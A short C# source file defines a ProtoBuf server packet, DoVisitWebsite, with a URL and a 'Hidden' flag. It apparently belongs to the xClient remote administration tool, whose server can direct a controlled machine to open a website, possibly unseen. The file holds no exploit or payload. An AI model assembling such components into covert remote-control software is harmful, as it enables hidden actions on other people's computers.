using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoVisitWebsite : IPacket
    {
        [ProtoMember(1)]
        public string URL { get; set; }

        [ProtoMember(2)]
        public bool Hidden { get; set; }

        public DoVisitWebsite()
        {
        }

        public DoVisitWebsite(string url, bool hidden)
        {
            this.URL = url;
            this.Hidden = hidden;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}